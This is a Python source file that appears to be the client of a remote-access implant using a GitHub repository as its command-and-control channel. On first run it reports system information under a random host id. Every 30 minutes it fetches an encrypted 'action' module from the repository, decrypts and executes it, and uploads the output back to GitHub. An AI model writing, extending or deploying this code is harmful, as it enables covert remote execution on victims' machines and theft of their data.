TOKEN = ''

import base64
import os.path
import random
import time
from loader import Loader
from helpers import run_cmd

def dependencies():
    run_cmd('pip install cryptography')
    run_cmd('pip install PyGithub')
    run_cmd('pip install pyautogui')


dependencies()

from cryptoprovider import encrypt, decrypt
from githubwrapper import GithubController

def upload_encrypt(file, controller, key):
    with open(file, 'rb') as f:
        controller.post_contents(file, base64.b64encode(encrypt(key, f.read())).decode('utf-8'))

def fetch_decrypt(file, controller, key):
    try:
        with open(file, 'wb') as f:
            f.write(decrypt(key, base64.b64decode(controller.get_contents(file))))
    except:
        pass

def fetch_actions(controller, key, id):
    contents = controller.get_contents('action')
    if contents is not None:
        action = base64.b64decode(contents).decode('utf-8')
        fetch_decrypt(action+'.py', controller, key)
        execute_action(controller, action, id) 

def execute_action(controller, action, id):
    mod = Loader.load(action).get_module()()
    mod.run()
    if mod.get_output() != '':
        controller.post_contents(id+"_"+action, mod.get_output())           

def main():
    controller = GithubController(TOKEN)
    key = controller.get_contents('key')
    
    id = ''
    if (os.path.isfile('id')):
        with open('id', 'r') as file:
            id = file.read()
    else:
        id = str(random.randint(0, 1000000))
        with open('id', 'w') as file:
            file.write(id)
        execute_action(controller, 'sysinfomodule', id)
    while(True):
        fetch_actions(controller, key, id)
        time.sleep(1800)

if __name__ == '__main__':
    main()